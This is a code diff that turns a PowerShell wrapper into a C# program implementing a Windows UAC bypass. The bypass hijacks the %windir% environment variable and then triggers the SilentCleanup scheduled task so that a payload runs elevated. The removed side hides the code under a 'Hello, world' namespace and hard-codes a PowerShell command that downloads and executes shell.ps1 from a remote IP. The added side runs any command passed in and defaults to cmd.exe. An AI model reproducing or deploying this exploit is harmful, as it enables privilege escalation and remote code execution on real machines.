@@ -1,33 +1,48 @@
-$assemblies=(
-	"System"
-)
+/*
+Created by: Julio Ureña (plaintext)
+Twitter: @JulioUrena
+Website: https://plaintext.do
 
-$source=@"
+Modified on 3/20/20 by Kevin Murphy (0xhexmex) to execute an arbitrary command string
+
+Compile: csc.exe uac_bypass_silentcleanup.cs
+Usage: uac_bypass_silentcleanup.exe C:\Path\To\Payload.exe
+
+Credits: The code is based on [rootm0s](https://github.com/rootm0s) python implementation. If you want to know more about his job and the methods he used, you can find his GitHub in here: [https://github.com/rootm0s/WinPwnage](https://github.com/rootm0s/WinPwnage)
+*/
+
 using System;
 using Microsoft.Win32;
 using System.Diagnostics;
 
-namespace Helloworld
+namespace UACBypass_SilentCleanup
 {
-	public static class Hello{
-		public static void Main(){
-
-			Console.WriteLine("Hello, world!");
+    class Program
+    {
+        static void Main(string[] args)
+        {
             // Payload to be executed
             Console.WriteLine("[+] Starting Bypass UAC.");
 
             string payload = "";
 
-            
+            if (args.Length > 0)
+            {
+                payload = args[0];
+                Console.WriteLine(@"[+] Payload to be Executed " + payload);
+            }
+            else
+            {
                 Console.WriteLine("[+] No Payload specified. Executing cmd.exe.");
-                payload = @"cmd /c powershell.exe -command iex (iwr -usebasicparsing http://192.168.100.14/shell.ps1)";
+                payload = @"C:\Windows\System32\cmd.exe";
+            }
 
             try
             {
                 // Registry Key Modification
                 RegistryKey key;
                 key = Registry.CurrentUser.CreateSubKey(@"Environment");
-                key.SetValue("windir", "cmd.exe /k " + payload + " & ", RegistryValueKind.String);
+                key.SetValue("windir", "cmd.exe /c \"" + payload + "\" & ", RegistryValueKind.String);
                 key.Close();
 
                 Console.WriteLine("[+] Enviroment Variabled %windir% Created.");
@@ -48,7 +63,7 @@ namespace Helloworld
                 ProcessStartInfo startInfo = new ProcessStartInfo();
                 startInfo.CreateNoWindow = true;
                 startInfo.UseShellExecute = false;
-                startInfo.FileName = "schtasks.exe";
+                startInfo.FileName = @"c:\windows\system32\schtasks.exe";
                 startInfo.Arguments = @"/Run /TN \Microsoft\Windows\DiskCleanup\SilentCleanup /I";
                 Process.Start(startInfo);
 
@@ -95,10 +110,6 @@ namespace Helloworld
             {
                 Console.WriteLine("[-] Unable to Clean the Registry.");
             }
-		}
-	}
+        }
+    }
 }
-"@
-
-Add-Type -ReferencedAssemblies $assemblies -TypeDefinition $source -Language CSharp
-[HelloWorld.Hello]::Main()
